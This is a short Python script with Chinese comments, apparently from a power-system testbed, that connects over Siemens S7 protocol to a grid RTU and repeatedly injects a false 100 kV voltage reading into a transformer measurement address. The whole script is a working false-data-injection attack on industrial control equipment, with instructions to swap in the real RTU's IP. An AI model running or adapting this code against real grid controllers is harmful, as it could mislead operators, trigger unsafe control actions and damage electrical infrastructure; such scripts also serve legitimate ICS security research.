#-----------------------------------------------------------------------------
# 攻击循环示例
import time
import snap7Comm  # 确保此模块已安装并正确引入

# 配置参数
RTU_IP = '127.0.0.1'  # 将此IP更改为电网RTU02的实际IP
RTU_PORT = 102
LIB_PATH = 'D:/Anaconda/envs/powersystem/Lib/site-packages/snap7/lib/snap7.dll'  # 替换为实际的snap7库路径
INT_TYPE = 2  # 假设2代表整数类型，根据实际库定义调整

# 初始化客户端
client = snap7Comm.s7CommClient(
    RTU_IP,
    rtuPort=RTU_PORT,
    snapLibPath=LIB_PATH
)

# 建立连接
connection = client.checkConn()

if connection:
    try:
        while True:
            print("Attack: Start inject out of MU measurement range false voltrage value (100kV) \nto lvl0 Transformer RTU-MU reading")
            client.setAddressVal(7, 4, 100, dataType=INT_TYPE)
            time.sleep(0.1)
            print("False data Inject finished!")
    except KeyboardInterrupt:
        print("攻击循环已手动终止")
else:
    print("错误：无法建立PLC连接")